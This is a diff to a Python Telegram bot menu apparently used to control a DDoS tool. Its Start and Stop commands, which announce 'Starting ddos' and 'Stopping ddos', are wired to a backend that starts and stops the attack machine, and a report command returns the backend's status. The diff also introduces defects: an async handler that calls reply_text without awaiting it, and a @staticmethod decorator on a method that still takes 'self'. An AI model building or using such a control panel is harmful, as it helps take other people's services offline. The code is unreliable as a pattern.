@@ -3,9 +3,10 @@ from telegram.ext import MessageHandler, Filters
 
 
 class Menu:
-    def __init__(self, bot):
+    def __init__(self, bot, backend):
         self._subs = set()
         self._bot = bot
+        self._backend = backend
 
     def get_subs(self):
         return self._subs
@@ -22,18 +23,20 @@ class Menu:
     def start(self, update, context):
         """Start ddos when the command Start is issued."""
         update.message.reply_text('Starting ddos')
+        self._backend.start_machine()
 
     def stop(self, update, context):
         """Stop ddos when the command Stop is issued."""
         update.message.reply_text('Stopping ddos')
+        self._backend.stop_machine()
 
     def help(self, update, context):
         """Send a message when the command /help or Help is issued."""
         update.message.reply_text('Use /key to display control panel')
 
-    def report(self, update, context):
+    async def report(self, update, context):
         """Send report message."""
-        update.message.reply_text('Nothing to report so far!')
+        update.message.reply_text(self._backend.get_report())
 
     def subscribe(self, update, context):
         """Add user to subs set"""
@@ -64,6 +67,7 @@ class Menu:
             reply_markup=ReplyKeyboardRemove()
         )
 
+    @staticmethod
     def main_menu_keyboard_reply(self):
         keyboard = [[KeyboardButton('Help'), KeyboardButton('Close')],
                     [KeyboardButton('Start'), KeyboardButton('Stop')],
